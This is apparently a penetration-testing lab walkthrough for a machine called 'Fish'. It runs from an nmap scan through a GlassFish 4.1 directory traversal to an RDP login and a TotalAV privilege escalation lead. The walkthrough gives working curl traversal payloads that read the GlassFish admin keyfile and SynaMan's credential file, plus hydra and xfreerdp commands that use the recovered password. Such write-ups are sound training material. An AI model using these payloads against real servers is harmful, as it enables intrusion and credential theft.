# Fish

## Nmap

```
nmap 192.168.213.168 -sS -sV -p- -Pn

PORT     STATE SERVICE              VERSION
3389/tcp open  ms-wbt-server?
3700/tcp open  giop                 CORBA naming service
4848/tcp open  http                 Sun GlassFish Open Source Edition  4.1
6060/tcp open  x11?
7676/tcp open  java-message-service Java Message Service 301
7680/tcp open  pando-pub?
8080/tcp open  http                 Sun GlassFish Open Source Edition  4.1
8181/tcp open  ssl/http             Sun GlassFish Open Source Edition  4.1
8686/tcp open  sun-as-jmxrmi?
```

Starting out we begin using `searchsploit` to discover know vulnerabilities against the services.

```bash
searchsploit -w "GlassFish 4.1"
```

![](<../../.gitbook/assets/image (246).png>)

Looks like the of GlassFish running is vulnerable to Directory Traversal. The following exploit examples can be used to read known system files.

**ExploitDB:** [https://www.exploit-db.com/exploits/39441](https://www.exploit-db.com/exploits/39441)

Using one of the examples in the link with the correct IP and port we are able to build a `curl` GET request to confirm the directory traversal.

```bash
curl http://<IP>:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini 
```

![](<../../.gitbook/assets/image (2052) (1) (1) (1) (1) (2) (1).png>)

After this I looked up configuration files for GlassFish to see if we can read any sensitive credential files. This StackOverflow [link](https://stackoverflow.com/questions/41078683/how-do-i-reset-the-forgotten-password-of-glassfish-server-4) proved to be informative and I was able to read the admin hash for GlassFish with a little bit of guesswork.

```bash
curl http://<IP>:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../glassfish4/glassfish/domains/domain1/config/admin-keyfileadmin
```

![](<../../.gitbook/assets/image (156) (2).png>)

Unfortunately however, I was unable to crack the hash and proceed with anything meaningful for now.

Looking through the rest of the open ports manually we come across the page "SynaMan" which we observe is running version 4.0.

![](<../../.gitbook/assets/image (535).png>)

Again, with `searchsploit` we are able to see if the version running is vulnerable.

```bash
searchsploit -w "SynaMan 4.0"
```

![](<../../.gitbook/assets/image (224).png>)

The `SMTP` disclosure is interesting to us:

**ExploitDB:** [https://www.exploit-db.com/exploits/45387](https://www.exploit-db.com/exploits/45387)

![](<../../.gitbook/assets/image (111).png>)

We see from the description that as we already have a directory traversal exploit on the system we can likely read the desired AppConfig.xml

```bash
curl http://<IP>:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../SynaMan/config/AppConfig.xml   
```

![](<../../.gitbook/assets/image (102).png>)

From the output we are able to tie together the following credentials:

```
arthur:KingOfAtlantis
```

Being as `RDP` is open a quick check with `Hydra` confirms the credentials are valid.

```bash
hydra -l "arthur" -p "KingOfAtlantis" rdp://<IP> 
```

![](<../../.gitbook/assets/image (36) (1).png>)

We can then connect via `RDP` to the target system.

```bash
xfreerdp /u:"arthur" /p:"KingOfAtlantis" +clipboard /v:<IP>
```

![](<../../.gitbook/assets/image (2050) (1) (1) (1) (1) (2).png>)

We see on the desktop a shortcut for the AV application `TotalAV`. Checking `appwiz.cpl` we see that the installed version is _4.14.31_.

![](<../../.gitbook/assets/image (139).png>)

`searchsploit` again shows a vulnerability with the installed version.

```bash
searchsploit -w "TotalAV 4.14.31"
```

![](<../../.gitbook/assets/image (2034).png>)

This version of `TotalAV` appears to be vulnerable to Privilege Escalation.

**ExploitDB:** [https://www.exploit-db.com/exploits/47897](https://www.exploit-db.com/exploits/47897)

**Youtube:** [https://www.youtube.com/watch?v=88qeaLq98Gc](https://www.youtube.com/watch?v=88qeaLq98Gc)
